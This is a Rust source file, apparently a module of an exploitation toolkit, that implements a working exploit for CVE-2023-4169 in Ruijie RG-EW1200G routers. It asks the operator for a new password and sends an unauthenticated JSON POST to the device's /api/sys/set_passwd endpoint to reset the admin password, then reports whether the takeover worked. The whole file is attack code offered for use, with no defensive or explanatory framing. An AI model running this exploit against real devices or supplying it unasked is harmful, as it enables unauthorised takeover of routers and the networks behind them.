use anyhow::Result;
use colored::*;
use reqwest::Client;
use std::time::Duration;

/// Ruijie RG-EW1200G Password Reset (CVE-2023-4169)
/// Vulnerable endpoint /api/sys/set_passwd allows auth bypass to reset admin password.

const DEFAULT_TIMEOUT_SECS: u64 = 10;

pub async fn run(target: &str) -> Result<()> {
    display_banner();
    
    let url = if target.starts_with("http") { target.to_string() } else { format!("http://{}", target) };
    let url = url.trim_end_matches('/').to_string();
    println!("[*] Target: {}", url.cyan());
    
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(DEFAULT_TIMEOUT_SECS))
        .build()?;

    use std::io::Write;
    print!("{}", "Enter new admin password: ".green());
    std::io::stdout().flush()?;
    let mut new_pass = String::new();
    std::io::stdin().read_line(&mut new_pass)?;
    let new_pass = new_pass.trim();

    let payload = serde_json::json!({
        "username": "web",
        "admin_new": new_pass
    });

    let exploit_url = format!("{}/api/sys/set_passwd", url);
    println!("[*] Attempting password reset at {}...", exploit_url.cyan());

    let resp = client.post(&exploit_url)
        .json(&payload)
        .send()
        .await?;

    let text = resp.text().await?;
    if text.contains(r#""result":"ok""#) {
        println!("{}", "[+] Password Reset Successful!".green().bold());
        println!("[+] New password: {}", new_pass);
    } else {
        println!("{}", "[-] Exploit failed.".red());
    }

    Ok(())
}

fn display_banner() {
    println!("{}", "Ruijie Password Reset (CVE-2023-4169)".green().bold());
}
